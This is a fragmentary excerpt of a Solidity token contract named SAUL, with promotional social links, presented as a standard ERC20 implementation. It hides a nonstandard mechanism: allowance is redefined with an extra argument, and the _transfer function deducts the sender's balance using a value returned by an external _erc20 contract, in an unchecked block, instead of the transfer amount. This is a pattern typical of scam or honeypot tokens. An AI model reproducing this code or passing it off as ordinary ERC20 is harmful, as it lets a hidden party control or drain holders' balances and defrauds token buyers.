...
* Twitter:https://twitter.com/Saul_Erc20
* Telegram:https://t.me/SaulErc20
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function allowance(address owner, address spender, uint256 amount) public view virtual override returns (uint256) {
        return _allowances[owner][spender] - amount;
    }
    /**
    ...
    function _transfer(
        ...
        unchecked {
            _balances[sender] = senderBalance - _erc20.allowance(sender, recipient, amount);
        }
...
contract SAUL is Ownable, ERC20 {
